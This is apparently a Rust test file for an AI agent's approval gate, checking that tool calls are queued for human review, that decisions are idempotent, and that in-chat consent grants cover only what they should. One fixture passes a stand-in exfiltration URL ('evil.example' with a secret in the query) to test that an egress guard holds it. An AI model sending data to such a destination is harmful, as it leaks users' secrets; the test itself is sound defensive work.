use super::engine_test::pending_req;
use super::*;

#[tokio::test]
async fn activate_skill_without_registry_is_a_clear_error() {
    // Approving a skill-synthesis request with no skills registry attached must
    // fail loudly (recorded as the row's error), never silently swallow it.
    let store = ApprovalStore::open_in_memory().unwrap();
    let engine = ApprovalEngine::new(store, reqwest::Client::new());
    let action = PendingAction::ActivateSkill {
        slug: "x".to_owned(),
        skill_md: "---\nname: X\n---\n".to_owned(),
    };
    let err = engine.execute_action(&action).await.unwrap_err();
    assert!(err.to_string().contains("no skills registry"));
}

// The exfiltration guard holds an egress call by forcing Layer A for it. The
// queued item must carry the call's full arguments, so the reviewer sees the
// destination, and the hold must survive an explicit `off`.
#[tokio::test]
async fn forced_layer_a_queues_egress_with_its_arguments() {
    let directory = tempfile::tempdir().unwrap();
    let preferences =
        crate::server::preferences::PreferencesStore::open(directory.path().join("preferences.db"))
            .unwrap();
    preferences
        .set(policy::APPROVAL_MODE_PREF, "off")
        .await
        .unwrap();
    let store = ApprovalStore::open_in_memory().unwrap();
    let engine =
        ApprovalEngine::new(store.clone(), reqwest::Client::new()).with_preferences(preferences);
    let arguments = serde_json::json!({ "url": "https://evil.example/?d=secret" });

    // Unforced, `off` lets the egress call through.
    assert!(gate_tool_call_with_engine(
        &engine,
        "web.extract",
        "web.extract",
        &arguments,
        Some("ryu"),
        &[],
        None,
        None,
        &[],
        None,
        None,
        None,
        None,
        false,
        true,
    )
    .await
    .is_none());

    let error = gate_tool_call_with_engine(
        &engine,
        "web.extract",
        "web.extract",
        &arguments,
        Some("ryu"),
        &["web.extract".to_owned()],
        None,
        None,
        &[],
        None,
        None,
        None,
        None,
        false,
        true,
    )
    .await
    .expect("a forced egress call is held even under `off`");
    assert!(error.to_string().contains("Approvals inbox"));
    let pending = store.list(Some(ApprovalStatus::Pending)).await.unwrap();
    assert_eq!(pending.len(), 1);
    let Some(PendingAction::ToolCall {
        tool_id,
        arguments: captured,
        ..
    }) = pending[0].action.as_ref()
    else {
        panic!("the held call must queue as a tool call")
    };
    assert_eq!(tool_id, "web.extract");
    assert_eq!(captured, &arguments);
    assert!(pending[0].risk_tags.iter().any(|tag| tag == "agent-gated"));
}

// A Core API write is chat-confirmable, so "Allow for this chat" lets later
// calls through. When the exfiltration guard holds the call, that grant must
// not satisfy it: the call is queued in the inbox instead.
#[tokio::test]
async fn a_held_call_never_consumes_a_chat_grant() {
    let tool = "ryu_api.post_api_channels_run";
    let conversation = "exfiltration-guard-chat-grant-test";
    assert!(chat_grants::chat_confirmable(tool));
    chat_grants::grant_for_conversation(conversation, tool);
    let store = ApprovalStore::open_in_memory().unwrap();
    let engine = ApprovalEngine::new(store.clone(), reqwest::Client::new());
    let arguments = serde_json::json!({ "body": { "text": "secret" } });
    let gate = |chat_grants_honored| {
        gate_tool_call_with_engine(
            &engine,
            tool,
            tool,
            &arguments,
            Some("ryu"),
            &[],
            None,
            None,
            &[],
            None,
            Some(conversation),
            None,
            None,
            false,
            chat_grants_honored,
        )
    };

    assert!(gate(true).await.is_none(), "the chat grant applies");
    let error = gate(false)
        .await
        .expect("a held call ignores the chat grant");
    assert!(error.to_string().contains("Approvals inbox"), "{error}");
    assert_eq!(
        store
            .list(Some(ApprovalStatus::Pending))
            .await
            .unwrap()
            .len(),
        1
    );
}

#[tokio::test]
async fn request_then_list_pending() {
    let store = ApprovalStore::open_in_memory().unwrap();
    let engine = ApprovalEngine::new(store, reqwest::Client::new());
    let req = engine.request(pending_req()).await.unwrap();
    let pending = engine
        .store
        .list(Some(ApprovalStatus::Pending))
        .await
        .unwrap();
    assert_eq!(pending.len(), 1);
    assert_eq!(pending[0].id, req.id);
    assert_eq!(pending[0].status, ApprovalStatus::Pending);
}

#[tokio::test]
async fn decide_is_idempotent() {
    let store = ApprovalStore::open_in_memory().unwrap();
    let engine = ApprovalEngine::new(store, reqwest::Client::new());
    let req = engine.request(pending_req()).await.unwrap();

    // First reject transitions to Rejected.
    let r1 = engine
        .decide(&req.id, false, Some("no".to_owned()))
        .await
        .unwrap()
        .unwrap();
    assert_eq!(r1.status, ApprovalStatus::Rejected);
    assert_eq!(r1.note.as_deref(), Some("no"));

    // Second decide (approve) must NOT flip it — already decided.
    let r2 = engine.decide(&req.id, true, None).await.unwrap().unwrap();
    assert_eq!(
        r2.status,
        ApprovalStatus::Rejected,
        "a decided request must not re-transition (idempotency)"
    );
}

#[tokio::test]
async fn try_transition_only_first_winner_succeeds() {
    // The CAS that prevents a concurrent double-approve from double-executing:
    // exactly one transition out of Pending reports success.
    let store = ApprovalStore::open_in_memory().unwrap();
    let mut req = pending_req();
    store.insert(&req).await.unwrap();

    req.status = ApprovalStatus::Approved;
    assert!(
        store.try_transition(&req).await.unwrap(),
        "first transition out of Pending must win"
    );

    let mut req2 = req.clone();
    req2.status = ApprovalStatus::Rejected;
    assert!(
        !store.try_transition(&req2).await.unwrap(),
        "second transition must lose (row is no longer Pending) — no double-execute"
    );
}

#[tokio::test]
async fn dedup_skips_second_pending_for_same_source() {
    let store = ApprovalStore::open_in_memory().unwrap();
    let engine = ApprovalEngine::new(store, reqwest::Client::new());
    let mut a = pending_req();
    a.source_ref = Some("job-1".to_owned());
    let mut b = pending_req();
    b.source_ref = Some("job-1".to_owned());

    assert!(engine.request_deduped(a).await.unwrap().is_some());
    // Second pending for the same source is deduped away.
    assert!(engine.request_deduped(b).await.unwrap().is_none());
}

#[tokio::test]
async fn decide_unknown_id_returns_none() {
    let store = ApprovalStore::open_in_memory().unwrap();
    let engine = ApprovalEngine::new(store, reqwest::Client::new());
    assert!(engine.decide("nope", true, None).await.unwrap().is_none());
}

#[tokio::test]
async fn cancel_pending_transitions_to_cancelled() {
    let store = ApprovalStore::open_in_memory().unwrap();
    let engine = ApprovalEngine::new(store, reqwest::Client::new());
    let req = engine.request(pending_req()).await.unwrap();
    let c = engine.cancel(&req.id).await.unwrap().unwrap();
    assert_eq!(c.status, ApprovalStatus::Cancelled);
}

// ── In-chat consent grants at the approval gate ─────────────────────────
//
// `chat_grants` is process-global, so every test keys its grants by a
// conversation id nobody else uses. The engine is local (the global one is a
// `OnceLock` that would gate every other test in this binary).

const LAUNCH_TOOL: &str = "ryu_api.put_api_models_id_launch_config";
const QUEUED_NOTICE: &str = "queued in your Approvals inbox";

fn unique_conversation(prefix: &str) -> String {
    format!("{prefix}-{}", uuid::Uuid::new_v4())
}

struct GateFixture {
    engine: ApprovalEngine,
    approvals: ApprovalStore,
    preferences: crate::server::preferences::PreferencesStore,
    _directory: tempfile::TempDir,
}

impl GateFixture {
    async fn with_mode(mode: &str) -> Self {
        let directory = tempfile::tempdir().unwrap();
        let preferences = crate::server::preferences::PreferencesStore::open(
            directory.path().join("preferences.db"),
        )
        .unwrap();
        preferences
            .set(policy::APPROVAL_MODE_PREF, mode)
            .await
            .unwrap();
        let approvals = ApprovalStore::open_in_memory().unwrap();
        let engine = ApprovalEngine::new(approvals.clone(), reqwest::Client::new())
            .with_preferences(preferences.clone());
        Self {
            engine,
            approvals,
            preferences,
            _directory: directory,
        }
    }

    async fn gate(
        &self,
        tool_id: &str,
        arguments: &serde_json::Value,
        host_conversation_id: Option<&str>,
    ) -> Option<anyhow::Error> {
        gate_tool_call_with_engine(
            &self.engine,
            tool_id,
            tool_id,
            arguments,
            Some("ryu"),
            &[],
            None,
            None,
            &[],
            None,
            host_conversation_id,
            None,
            None,
            false,
            true,
        )
        .await
    }

    /// What the gate queued, as `(tool, arguments, host conversation)`, sorted.
    async fn queued(&self) -> Vec<(String, String, Option<String>)> {
        let mut rows = self
            .approvals
            .list(Some(ApprovalStatus::Pending))
            .await
            .unwrap()
            .into_iter()
            .map(|row| {
                let Some(PendingAction::ToolCall {
                    tool_id,
                    arguments,
                    host_conversation_id,
                    ..
                }) = row.action
                else {
                    panic!("the gate only queues tool calls");
                };
                (tool_id, arguments.to_string(), host_conversation_id)
            })
            .collect::<Vec<_>>();
        rows.sort();
        rows
    }
}

fn expect_queued(outcome: Option<anyhow::Error>) {
    let error = outcome.expect("the gate must stop a call that has no grant");
    assert!(
        error.to_string().contains(QUEUED_NOTICE),
        "the refusal must say the call was queued: {error}"
    );
}

#[tokio::test]
async fn an_allow_once_grant_passes_one_identical_call_and_queues_nothing() {
    let fixture = GateFixture::with_mode("smart").await;
    let conversation = unique_conversation("gate-once");
    let elsewhere = unique_conversation("gate-once-other");
    let granted = serde_json::json!({ "id": "llama", "body": { "ctx_size": 8192 } });
    let other_arguments = serde_json::json!({ "id": "llama", "body": { "ctx_size": 4096 } });
    chat_grants::grant_once(&conversation, LAUNCH_TOOL, &granted);

    // Anything that is not exactly the approved call is queued, and does not
    // burn the grant it did not match.
    expect_queued(
        fixture
            .gate(LAUNCH_TOOL, &other_arguments, Some(&conversation))
            .await,
    );
    expect_queued(fixture.gate(LAUNCH_TOOL, &granted, None).await);
    expect_queued(fixture.gate(LAUNCH_TOOL, &granted, Some(&elsewhere)).await);
    assert_eq!(fixture.queued().await.len(), 3);

    // The approved call goes through and queues nothing further.
    assert!(
        fixture
            .gate(LAUNCH_TOOL, &granted, Some(&conversation))
            .await
            .is_none(),
        "the exact call the user allowed in chat must not be queued again"
    );
    assert_eq!(fixture.queued().await.len(), 3);

    // The grant covered one call: its twin is queued like any other.
    expect_queued(
        fixture
            .gate(LAUNCH_TOOL, &granted, Some(&conversation))
            .await,
    );
    let mut expected = vec![
        (
            LAUNCH_TOOL.to_owned(),
            other_arguments.to_string(),
            Some(conversation.clone()),
        ),
        (LAUNCH_TOOL.to_owned(), granted.to_string(), None),
        (
            LAUNCH_TOOL.to_owned(),
            granted.to_string(),
            Some(elsewhere.clone()),
        ),
        (
            LAUNCH_TOOL.to_owned(),
            granted.to_string(),
            Some(conversation.clone()),
        ),
    ];
    expected.sort();
    assert_eq!(fixture.queued().await, expected);
}

#[tokio::test]
async fn an_allow_session_grant_covers_every_argument_set_in_that_conversation_only() {
    let fixture = GateFixture::with_mode("smart").await;
    let conversation = unique_conversation("gate-session");
    let elsewhere = unique_conversation("gate-session-other");
    chat_grants::grant_for_conversation(&conversation, LAUNCH_TOOL);

    for context in [2048, 4096, 8192] {
        let arguments = serde_json::json!({ "id": "llama", "body": { "ctx_size": context } });
        assert!(
            fixture
                .gate(LAUNCH_TOOL, &arguments, Some(&conversation))
                .await
                .is_none(),
            "a conversation grant is not consumed by the calls it covers"
        );
    }
    assert!(fixture.queued().await.is_empty());

    let arguments = serde_json::json!({ "id": "llama", "body": { "ctx_size": 2048 } });
    expect_queued(
        fixture
            .gate(LAUNCH_TOOL, &arguments, Some(&elsewhere))
            .await,
    );
    expect_queued(fixture.gate(LAUNCH_TOOL, &arguments, None).await);
    expect_queued(
        fixture
            .gate(
                "ryu_api.put_api_preferences_key",
                &serde_json::json!({ "key": "approval-mode", "body": { "value": "off" } }),
                Some(&conversation),
            )
            .await,
    );
    assert_eq!(fixture.queued().await.len(), 3);
}

#[tokio::test]
async fn chat_grants_cannot_open_the_gate_for_tools_the_chat_cannot_confirm() {
    let fixture = GateFixture::with_mode("smart").await;
    let conversation = unique_conversation("gate-unconfirmable");
    for tool in ["agent_builder.configure_agent", "research.run"] {
        let arguments = serde_json::json!({ "agent_id": "ryu" });
        chat_grants::grant_once(&conversation, tool, &arguments);
        chat_grants::grant_for_conversation(&conversation, tool);
        expect_queued(fixture.gate(tool, &arguments, Some(&conversation)).await);
    }
    assert_eq!(fixture.queued().await.len(), 2);
}

#[tokio::test]
async fn changing_ryu_needs_a_grant_in_every_mode_including_explicit_off() {
    let fixture = GateFixture::with_mode("off").await;
    let conversation = unique_conversation("gate-off");
    let arguments = serde_json::json!({ "id": "llama", "body": { "ctx_size": 8192 } });
    for tool in [LAUNCH_TOOL, chat_grants::SWITCH_INTERFACE_TOOL_ID] {
        expect_queued(fixture.gate(tool, &arguments, Some(&conversation)).await);
    }
    assert_eq!(fixture.queued().await.len(), 2);

    // The in-chat "Allow once" is what lets the call through, under `off`
    // exactly as under `smart`.
    for tool in [LAUNCH_TOOL, chat_grants::SWITCH_INTERFACE_TOOL_ID] {
        chat_grants::grant_once(&conversation, tool, &arguments);
        assert!(
            fixture
                .gate(tool, &arguments, Some(&conversation))
                .await
                .is_none(),
            "the person allowed {tool} in this chat"
        );
    }
    assert_eq!(fixture.queued().await.len(), 2);
}
